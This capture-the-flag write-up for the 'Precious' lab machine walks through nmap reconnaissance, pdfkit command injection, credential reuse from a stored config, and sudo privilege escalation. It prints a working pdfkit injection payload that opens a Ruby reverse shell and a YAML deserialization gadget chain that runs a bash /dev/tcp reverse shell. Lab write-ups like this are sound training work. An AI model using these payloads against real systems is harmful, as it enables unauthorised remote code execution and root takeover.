# Information Gathering and Vulnerability Scanning

Nmap:
```bash
$ nmap -sC -sV -A 10.10.11.189 -o nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-29 12:30 EDT
Nmap scan report for 10.10.11.189
Host is up (0.037s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
```

---
Get headers from burpsuite and got the server software and version: **Phusion Passenger(R) 6.0.15**
```sh
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Wed, 29 Mar 2023 17:11:00 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
Content-Length: 506
```
ExploitDB and CVE details does not show any vuln related. Still, it's valuable info!

---
Headers look weird to:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

why image?

---
htmltopdf 0.12.6 is the plugin for ruby for the pdf
https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently

---
webserver is running `pdfkit v0.8.6` for the html to pdf
https://github.com/shamo0/PDFkit-CMD-Injection
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
---

# Attack & Exploits
PDFkit-CMD-Injection looks really good.

```r
POST / HTTP/1.1
Host: precious.htb
Content-Length: 144
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://precious.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://precious.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


url=http%3a//10.10.14.101%3a4040/%3fname%3d%2520`+ruby+-rsocket+-e'spawn("bash",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("10.10.14.101",4040))'`
```

```bash
python -m http.server 80
nc -lvnp 4040 

cd /home/ruby
cat .bundle/config
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:***********" 

su henry
Password: ***********
id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
cd
cat user.txt
**************
```

----
# Priv escalation

Run common enum and found a custom script for update dependencies:
```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Found this about priv esc in ruby:
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/
```bash
henry@precious:~$ cd /home/henry/
henry@precious:~$ vi dependencies.yml 
```
```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.136/4040 0>&1'"
         method_id: :resolve
```

Set up netcat listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4040
listening on [any] 4040 ...
``` 

And finally run the script:
```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
```




# Analysis

- Outdate version on webserver is running `pdfkit v0.8.6` for the html to pdf causes a RCE for ruby user :(
- Then a plain text stored creds lead into henry user being affected
- Finally, priv esc:
	- sudo admin rights for a custom script? that's a risk
	- conbined that the scrip is not using absolute path leads into root running any dependecies.yml that is provided

Really funny box!